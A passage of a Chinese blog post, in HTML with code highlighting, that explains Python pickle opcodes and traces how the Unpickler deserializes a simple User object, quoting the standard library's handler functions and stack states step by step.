class="token string">b'o'</span>   <span class="token comment"># build &amp; push class instance</span>PUT            <span class="token operator">=</span> <span class="token string">b'p'</span>   <span class="token comment"># store stack top in memo; index is string arg</span>BINPUT         <span class="token operator">=</span> <span class="token string">b'q'</span>   <span class="token comment">#   "     "    "   "   " ;   "    " 1-byte arg</span>LONG_BINPUT    <span class="token operator">=</span> <span class="token string">b'r'</span>   <span class="token comment">#   "     "    "   "   " ;   "    " 4-byte arg</span>SETITEM        <span class="token operator">=</span> <span class="token string">b's'</span>   <span class="token comment"># add key+value pair to dict</span>TUPLE          <span class="token operator">=</span> <span class="token string">b't'</span>   <span class="token comment"># build tuple from topmost stack items</span>EMPTY_TUPLE    <span class="token operator">=</span> <span class="token string">b')'</span>   <span class="token comment"># push empty tuple</span>SETITEMS       <span class="token operator">=</span> <span class="token string">b'u'</span>   <span class="token comment"># modify dict by adding topmost key+value pairs</span>BINFLOAT       <span class="token operator">=</span> <span class="token string">b'G'</span>   <span class="token comment"># push float; arg is 8-byte float encoding</span>TRUE           <span class="token operator">=</span> <span class="token string">b'I01\n'</span>  <span class="token comment"># not an opcode; see INT docs in pickletools.py</span>FALSE          <span class="token operator">=</span> <span class="token string">b'I00\n'</span>  <span class="token comment"># not an opcode; see INT docs in pickletools.py</span><span class="token comment"># Protocol 2</span>PROTO          <span class="token operator">=</span> <span class="token string">b'\x80'</span>  <span class="token comment"># identify pickle protocol</span>NEWOBJ         <span class="token operator">=</span> <span class="token string">b'\x81'</span>  <span class="token comment"># build object by applying cls.__new__ to argtuple</span>EXT1           <span class="token operator">=</span> <span class="token string">b'\x82'</span>  <span class="token comment"># push object from extension registry; 1-byte index</span>EXT2           <span class="token operator">=</span> <span class="token string">b'\x83'</span>  <span class="token comment"># ditto, but 2-byte index</span>EXT4           <span class="token operator">=</span> <span class="token string">b'\x84'</span>  <span class="token comment"># ditto, but 4-byte index</span>TUPLE1         <span class="token operator">=</span> <span class="token string">b'\x85'</span>  <span class="token comment"># build 1-tuple from stack top</span>TUPLE2         <span class="token operator">=</span> <span class="token string">b'\x86'</span>  <span class="token comment"># build 2-tuple from two topmost stack items</span>TUPLE3         <span class="token operator">=</span> <span class="token string">b'\x87'</span>  <span class="token comment"># build 3-tuple from three topmost stack items</span>NEWTRUE        <span class="token operator">=</span> <span class="token string">b'\x88'</span>  <span class="token comment"># push True</span>NEWFALSE       <span class="token operator">=</span> <span class="token string">b'\x89'</span>  <span class="token comment"># push False</span>LONG1          <span class="token operator">=</span> <span class="token string">b'\x8a'</span>  <span class="token comment"># push long from &lt; 256 bytes</span>LONG4          <span class="token operator">=</span> <span class="token string">b'\x8b'</span>  <span class="token comment"># push really big long</span>_tuplesize2code <span class="token operator">=</span> <span class="token punctuation">[</span>EMPTY_TUPLE<span class="token punctuation">,</span> TUPLE1<span class="token punctuation">,</span> TUPLE2<span class="token punctuation">,</span> TUPLE3<span class="token punctuation">]</span><span class="token comment"># Protocol 3 (Python 3.x)</span>BINBYTES       <span class="token operator">=</span> <span class="token string">b'B'</span>   <span class="token comment"># push bytes; counted binary string argument</span>SHORT_BINBYTES <span class="token operator">=</span> <span class="token string">b'C'</span>   <span class="token comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span><span class="token comment"># Protocol 4</span>SHORT_BINUNICODE <span class="token operator">=</span> <span class="token string">b'\x8c'</span>  <span class="token comment"># push short string; UTF-8 length &lt; 256 bytes</span>BINUNICODE8      <span class="token operator">=</span> <span class="token string">b'\x8d'</span>  <span class="token comment"># push very long string</span>BINBYTES8        <span class="token operator">=</span> <span class="token string">b'\x8e'</span>  <span class="token comment"># push very long bytes string</span>EMPTY_SET        <span class="token operator">=</span> <span class="token string">b'\x8f'</span>  <span class="token comment"># push empty set on the stack</span>ADDITEMS         <span class="token operator">=</span> <span class="token string">b'\x90'</span>  <span class="token comment"># modify set by adding topmost stack items</span>FROZENSET        <span class="token operator">=</span> <span class="token string">b'\x91'</span>  <span class="token comment"># build frozenset from topmost stack items</span>NEWOBJ_EX        <span class="token operator">=</span> <span class="token string">b'\x92'</span>  <span class="token comment"># like NEWOBJ but work with keyword only arguments</span>STACK_GLOBAL     <span class="token operator">=</span> <span class="token string">b'\x93'</span>  <span class="token comment"># same as GLOBAL but using names on the stacks</span>MEMOIZE          <span class="token operator">=</span> <span class="token string">b'\x94'</span>  <span class="token comment"># store top of the stack in memo</span>FRAME            <span class="token operator">=</span> <span class="token string">b'\x95'</span>  <span class="token comment"># indicate the beginning of a new frame</span><span class="token comment"># Protocol 5</span>BYTEARRAY8       <span class="token operator">=</span> <span class="token string">b'\x96'</span>  <span class="token comment"># push bytearray</span>NEXT_BUFFER      <span class="token operator">=</span> <span class="token string">b'\x97'</span>  <span class="token comment"># push next out-of-band buffer</span>READONLY_BUFFER  <span class="token operator">=</span> <span class="token string">b'\x98'</span>  <span class="token comment"># make top of stack readonly</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的内容就是pickle中定义的所有字节码了，我们先略过这部分不谈，我们先来看后面的反序列化中对于不同字节码的实现来更好的理解每个字节码的注释内容</p>        <h1 id="关于pickle详细执行过程"   >          <a href="#关于pickle详细执行过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于pickle详细执行过程" class="headerlink" title="关于pickle详细执行过程"></a>关于pickle详细执行过程</h1>              <h2 id="起因"   >          <a href="#起因" class="heading-link"><i class="fas fa-link"></i></a><a href="#起因" class="headerlink" title="起因"></a>起因</h2>      <p>孩子比较呆，对于什么栈之类的描述没法很好理解，所以还是自己跑一下吧，这篇文会用几个不同的例子来详细说明</p>        <h2 id="基础内容分析"   >          <a href="#基础内容分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础内容分析" class="headerlink" title="基础内容分析"></a>基础内容分析</h2>      <p>首先我们先看看调用load时的pickle类的定义内容，这有利于我们对后面的操作进行理解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>_unframer <span class="token operator">=</span> _Unframer<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_file_read<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_file_readline<span class="token punctuation">)</span>self<span class="token punctuation">.</span>read <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>read <span class="token comment">#字节读取，没啥好说的，下面也是</span>self<span class="token punctuation">.</span>readinto <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readintoself<span class="token punctuation">.</span>readline <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readlineself<span class="token punctuation">.</span>metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储栈（？，我们目前可以这么叫他，这里存放的是与目前这步无关的内容</span>self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#操作栈（？，这里存储的就是我们当前这一步操作所需要的内容</span>self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append <span class="token comment"># 对self的append操作等同于对栈的append操作</span>self<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token number">0</span>read <span class="token operator">=</span> self<span class="token punctuation">.</span>read <span class="token comment">#读一位</span>dispatch <span class="token operator">=</span> self<span class="token punctuation">.</span>dispatch <span class="token comment">#pickle预置的字节码和函数的对应关系</span><span class="token keyword">try</span><span class="token punctuation">:</span> <span class="token comment">#反序列化整体逻辑，首先通过read读入一位字节码，判断是否是字节类型，取出首位字节码对应的函数进行执行</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>key <span class="token operator">=</span> read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> key<span class="token punctuation">:</span>        <span class="token keyword">raise</span> EOFError        <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> bytes_types<span class="token punctuation">)</span>        dispatch<span class="token punctuation">[</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token comment">#进入对应读出字节码的函数中</span><span class="token keyword">except</span> _Stop <span class="token keyword">as</span> stopinst<span class="token punctuation">:</span><span class="token keyword">return</span> stopinst<span class="token punctuation">.</span>value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212041745342.png" alt="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212041745342.png"></p>        <h2 id="实例分析"   >          <a href="#实例分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>              <h3 id="正常类反序列化"   >          <a href="#正常类反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#正常类反序列化" class="headerlink" title="正常类反序列化"></a>正常类反序列化</h3>      <p>第一个是一个正常的类的对象的序列化和反序列化，先使用了<code>pickletools.optimize</code>对字节码进行了精简，方便后续分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">"Jlan"</span>        self<span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">"pass"</span>a<span class="token operator">=</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>b<span class="token operator">=</span>pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>b<span class="token punctuation">)</span>x<span class="token operator">=</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token comment">#b'ccopy_reg\n_reconstructor\n(c__main__\nUser\nc__builtin__\nobject\nNtR&#125;(X\x08\x00\x00\x00usernameX\x04\x00\x00\x00JlanX\x08\x00\x00\x00passwordX\x04\x00\x00\x00passub.'</span><span class="token comment">#     0: c    GLOBAL     'copy_reg _reconstructor'</span><span class="token comment">#    25: (    MARK</span><span class="token comment">#    26: c        GLOBAL     '__main__ User'</span><span class="token comment">#    41: c        GLOBAL     '__builtin__ object'</span><span class="token comment">#    61: N        NONE</span><span class="token comment">#    62: t        TUPLE      (MARK at 25)</span><span class="token comment">#    63: R    REDUCE</span><span class="token comment">#    64: &#125;    EMPTY_DICT</span><span class="token comment">#    65: (    MARK</span><span class="token comment">#    66: X        BINUNICODE 'username'</span><span class="token comment">#    79: X        BINUNICODE 'Jlan'</span><span class="token comment">#    88: X        BINUNICODE 'password'</span><span class="token comment">#   101: X        BINUNICODE 'pass'</span><span class="token comment">#   110: u        SETITEMS   (MARK at 65)</span><span class="token comment">#   111: b    BUILD</span><span class="token comment">#   112: .    STOP</span><span class="token comment"># highest protocol among opcodes = 1</span><span class="token comment"># 详细过程可以看上面啦，pickletools官方进行的解析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面我们按每个操作来进行说明</p><ul><li><p><code>ccopy_reg\n_reconstructor\n</code></p><p>首先取出的是c操作符，对应的是GLOBAL操作，进入<code>load_global</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_global</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>module <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token comment">#读一行，存入module，也就是模块名</span>    name <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token comment">#读一行，存入name，也就是模块中的方法或属性</span>    klass <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token comment">#通过find_class方法找到对应的方法</span>    self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>klass<span class="token punctuation">)</span><span class="token comment">#将找到的内容压入栈中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Subclasses may override this.</span>    sys<span class="token punctuation">.</span>audit<span class="token punctuation">(</span><span class="token string">'pickle.find_class'</span><span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>fix_imports<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">:</span>            module<span class="token punctuation">,</span> name <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">[</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> module <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">:</span>            module <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">[</span>module<span class="token punctuation">]</span>    <span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> level<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#通过import方法导入模块</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _getattribute<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token comment">#取出对应属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>c:GLOBAL:load_global</code>：GLOBAL操作做的事就是取出<code>模块.属性名</code>并压入栈</p></li><li><p><code>(c__main__\nUser\nc__builtin__\nobject\n</code><br>首先取出的是(操作符，对应的是MARK操作，进入<code>load_mark</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token comment">#将操作栈的内容整个压入存储栈</span>    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#清空操作栈</span>    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>(:MARK:load_mark</code>：MARK操作将操作栈中所有内容压入存储栈，并清空操作栈</p><p>  然后就是两次GLOBAL操作加一次NONE操作</p></li><li><p><code>N</code><br>取出N操作符，对应NONE操作，进入<code>load_none</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_none</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <code>(:MARK:load_mark</code>：NONE操作将一个None对象压入操作栈</p><p>  经过这些操作后操作栈和存储栈的情况如下</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'__main__.User'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span>self<span class="token punctuation">.</span>metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>function _reconstructor at <span class="token number">0x1006735e0</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>t</code><br>取出t操作符，对应TUPLE操作，进入<code>load_tuple</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_tuple</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#进入pop_mark方法，取得之前操作栈的数据</span>    self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将之前操作栈的数据整体压入当前操作栈</span><span class="token keyword">def</span> <span class="token function">pop_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token comment">#将目前操作栈中的所有内容存入到items中</span>    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#弹出存储栈中的一个元素，并将其赋给操作栈</span>    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append    <span class="token keyword">return</span> items<span class="token comment">#返回原始操作栈中的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>t:TUPLE:load_tuple</code>：TUPLE操作将最后一个mark标记的栈和现在的操作栈（转为元组）压入操作栈</p><p>  还是看一下操作栈和存储栈的状态吧</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>function _reconstructor at <span class="token number">0x1006735e0</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'__main__.User'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">]</span>self<span class="token punctuation">.</span>metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>R</code><br>取出R操作符，对应REDUCE操作，进入<code>load_reduce</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_reduce</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token comment">#将目前栈中内容放入函数内变量中</span>    args <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#弹出栈中最后一个内容做函数参数</span>    func <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#取出栈中最后一个元素做函数方法</span>    stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token comment">#将函数执行结果存入栈中覆盖函数方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>R:REDUCE:load_reduce</code>：REDUCE操作将操作栈的最后一个元素作为函数参数，倒数第二个元素作为函数方法，将函数执行结果放到操作栈末尾</p></li><li><p><code>&#125;</code><br>取出}操作符，对应EMPTY_DICT，进入<code>load_empty_dictionary</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_empty_dictionary</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <code>&#125;:EMPTY_DICT:load_empty_dictionary</code>：EMPTY_DICT操作将一个空字典压入操作栈</p></li><li><p><code>(X\x08\x00\x00\x00usernameX\x04\x00\x00\x00JlanX\x08\x00\x00\x00passwordX\x04\x00\x00\x00pass</code><br>第一个压栈操作之前已经看过了，直接来看X操作符对应的内容，<code>load_binunicode</code></p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_binunicode</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#以小端头存储方式读取一个无符号int数（4位），读出后面需要的内容的长度</span>    <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span class="token punctuation">:</span>        <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINUNICODE exceeds system's maximum size "</span>                              <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'surrogatepass'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>X:BINUNICODE:load_binunicode</code>：<code>BINUNICODE</code>操作先读取字符串长度，然后按UTF-8编码读入内容并压入栈中</p><p>  操作完看栈</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>__main__<span class="token punctuation">.</span>User <span class="token builtin">object</span> at <span class="token number">0x105d9e0a0</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment">#一开始的mark操作压入的</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'Jlan'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>u</code><br>取出u操作符，对应SETITEMS，进入<code>load_setitems</code>函数（这个名字超明显）</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_setitems</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#把当前操作栈数据取出，存储栈的内容放入操作栈</span>    <span class="token builtin">dict</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#把当前栈的最后一个属性取出作为字典</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">dict</span><span class="token punctuation">[</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#按照单数键，双数值的方式把items中的内容转成字典</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>u:SETITEMS:load_setitems</code>：<code>SETITEMS</code>操作将存储栈的内容取出到操作栈中，然后将原本操作栈的数据转为字典并替换掉上一步（}操作符）中压入的空字典</p></li><li><p><code>b</code><br>取出b操作符，对应BUILD，进入<code>load_build</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># call __setstate__ or __dict__.update()</span><span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack    state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#把上一步生成的属性字典弹出</span>    inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#取出要进行操作的对象</span>    setstate <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#检查有没有__setstate__方法，有就调用</span>    <span class="token keyword">if</span> setstate <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>   